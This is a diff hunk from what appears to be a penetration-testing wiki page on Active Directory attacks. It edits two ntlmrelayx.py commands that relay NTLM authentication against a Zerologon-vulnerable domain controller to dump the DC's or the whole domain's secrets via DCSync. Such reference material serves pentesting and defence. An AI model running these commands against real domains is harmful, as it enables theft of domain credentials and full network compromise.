@@ -48,10 +48,10 @@ This attack can also be operated with a [relayed NTLM authentication](../../ntlm
 
 ```bash
 # target vulnerable to Zerologon, dump DC's secrets only
-ntlmrelayx.py -t dcsync://'DOMAINCONTROLLER'
+ntlmrelayx.py -t "dcsync://$DC_HOST"
 
 # target vulnerable to Zerologon, dump Domain's secrets
-ntlmrelayx.py -t dcsync://'DOMAINCONTROLLER' -auth-smb 'DOMAIN'/'LOW_PRIV_USER':'PASSWORD'
+ntlmrelayx.py -t "dcsync://$DC_HOST" -auth-smb "$DOMAIN/$USER:$PASSWORD"
 ```
 
 
